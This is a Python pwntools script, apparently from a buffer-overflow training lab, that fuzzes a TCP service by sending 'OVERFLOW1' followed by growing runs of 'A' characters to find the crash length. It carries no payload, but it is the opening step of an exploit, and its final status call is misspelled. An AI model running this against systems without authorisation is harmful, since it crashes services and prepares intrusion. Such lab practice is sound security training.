#!/usr/bin/env python3

import socket
import sys
import six
import time
from pwn import *

def buffer_creation():
	global buffe 
	p1.status("Creando strings para realizar fuzzing ")	
	buffe = []
	offset =  100	
	while len(buffe) < 30:
		buffe.append('A' * offset)
		offset += 100	
	time.sleep(1)	
	fuzzing()

def fuzzing():
	global string
	p1.status("Iniciando fuzzing ")
	for string in buffe:
		try:
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			conn = sock.connect((Target,Port))
			sock.settimeout(timeout)

			print(sock.recv(1024).decode('utf-8'))

			log.info("Enviando ---> {} bytes".format(len(string)))

			Overflow = "OVERFLOW1 "+str(string)

			sock.send(six.b(Overflow))

			print(sock.recv(1024).decode('utf-8'))

			sock.close()

		except Exception as error:
			log.failure(str(error))
			sys.exit(1)

if __name__ == '__main__':
	global p1
	global Target
	global Port
	global timeout	

	try:
		p1 = log.progress("Fuzzing Overflow")

		#Target
		Target  = '172.168.1.176'
		Port    = 1337
		timeout = 5

		buffer_creation()

		p1.succes("Proceso finalizado Correctamente")

	except Exception as error:
		log.failure(str(error))
		sys.exit(1)

	except KeyboardInterrupt:
		log.failure("Salida Forzada ....")
		log.info("Total enviando ... {} bytes".format(len(string)))
		sys.exit(0)
